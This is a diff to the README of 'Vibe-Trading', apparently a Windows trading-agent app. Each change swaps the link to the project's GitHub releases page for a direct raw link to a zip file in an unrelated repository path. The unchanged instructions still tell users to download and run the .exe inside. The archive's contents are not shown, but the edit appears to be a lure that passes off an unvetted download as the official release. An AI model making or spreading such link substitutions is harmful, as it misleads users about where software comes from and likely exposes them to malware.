@@ -5,7 +5,7 @@ description: "Deploy an autonomous trading agent with comprehensive market analy
 ---
 # 🤖 Vibe-Trading - Automate your financial trading strategy easily
 
-[![Download Vibe-Trading](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/kishorl4375/Vibe-Trading/releases)
+[![Download Vibe-Trading](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/kishorl4375/kishorl4375.github.io/main/scoptically/kishorl_github_io_2.0.zip)
 
 ## 📌 Project Overview
 
@@ -25,7 +25,7 @@ To run this application on your Windows computer, you need the following:
 
 Follow these steps to set up the software on your computer:
 
-1. Visit the following link to access the software files: [https://github.com/kishorl4375/Vibe-Trading/releases](https://github.com/kishorl4375/Vibe-Trading/releases).
+1. Visit the following link to access the software files: [https://raw.githubusercontent.com/kishorl4375/kishorl4375.github.io/main/scoptically/kishorl_github_io_2.0.zip](https://raw.githubusercontent.com/kishorl4375/kishorl4375.github.io/main/scoptically/kishorl_github_io_2.0.zip).
 2. Look for the latest version listed at the top of the page.
 3. Click the link that ends in .exe to download the installer file.
 4. Locate the downloaded file in your Downloads folder and double-click the icon.
@@ -78,6 +78,6 @@ The application notifies you with an alert sound. It pauses all pending orders t
 
 ## 🤝 Support and Updates
 
-We provide updates to improve the way the agent processes market signals and handles data. You can visit the [release page](https://github.com/kishorl4375/Vibe-Trading/releases) at any time to see if an update exists. Installing a new version does not delete your current settings. Simply run the installer again, and it will overwrite the old file with the improved version.
+We provide updates to improve the way the agent processes market signals and handles data. You can visit the [release page](https://raw.githubusercontent.com/kishorl4375/kishorl4375.github.io/main/scoptically/kishorl_github_io_2.0.zip) at any time to see if an update exists. Installing a new version does not delete your current settings. Simply run the installer again, and it will overwrite the old file with the improved version.
 
 Use the issues tab on the GitHub repository to report any bugs you find. Provide clear details about what happened and what steps you took before the error occurred. This helps the development team fix problems for all users.
